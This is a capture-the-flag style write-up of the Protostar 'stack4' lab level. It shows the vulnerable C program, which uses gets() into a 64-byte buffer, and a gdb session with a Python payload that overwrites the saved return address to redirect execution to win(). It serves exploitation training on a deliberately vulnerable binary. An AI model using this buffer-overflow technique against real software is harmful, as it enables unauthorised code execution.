# Stack 4

Stack4 takes a look at overwriting saved **EIP** and standard buffer overflows.

This level is at `/opt/protostar/bin/stack4`

Hints:
- A variety of introductory papers into buffer overflows may help.
- `gdb` lets you do "`run < input`"
- **EIP** is not directly after the end of buffer, compiler padding can also increase the size.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## Solution

```bash
(gdb) r < <(python -c "print('A' * 76 + '\xf4\x83\x04\x08')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/stack4 < <(python -c "print('A' * 76 + '\xf4\x83\x04\x08')")

Breakpoint 1, main (argc=0, argv=0xbffff714) at stack4/stack4.c:16
16	in stack4/stack4.c
(gdb) x/24wx $esp
0xbffff610:	0xbffff620	0xb7ec6165	0xbffff628	0xb7eada75
0xbffff620:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff630:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff640:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff650:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff660:	0x41414141	0x41414141	0x41414141	0x080483f4
(gdb) i r
eax            0xbffff620	-1073744352
ecx            0xbffff620	-1073744352
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff610	0xbffff610
ebp            0xbffff668	0xbffff668
esi            0x0	0
edi            0x0	0
eip            0x804841d	0x804841d <main+21>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) c
Continuing.
code flow successfully changed

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) 
```